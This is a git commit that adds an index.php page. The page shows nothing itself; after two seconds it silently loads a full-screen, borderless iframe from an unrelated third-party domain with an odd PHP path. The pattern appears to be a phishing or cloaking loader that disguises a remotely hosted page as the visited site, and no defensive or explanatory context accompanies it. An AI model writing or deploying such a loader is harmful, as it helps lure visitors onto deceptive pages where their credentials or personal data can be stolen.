ec6ec0c4dd28e19db3f696187cc5d369f6183107
bennounamohamed <ooasiica@gmail.com>
2024-06-26 03:45:24 +0100

    Create index.php

---
+++ index.php
@@ -0,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta content="IE=EmulateIE7">
+<meta content="width=device-width, initial-scale=1" name="viewport">
+<title></title>
+<style>
+body, head, html {
+overflow: hidden!important;
+margin:0px;
+}
+</style>
+</head>
+<body>  
+<div class="sec" id="sec"></div>
+<script>
+function loadScript(src){let iframe = document.createElement('iframe');iframe.src = src;
+iframe.height = screen.height;iframe.width = "100%";iframe.scrolling = "yes";
+iframe.frameBorder = "0";document.body.append(iframe);}
+function load(){loadScript('https://www.morepersonaleogmontering.no/more/ma///bleu.php');}
+setTimeout(function(){
+load();  
+}, 2000); 
+</script>
+</body>
+</html>
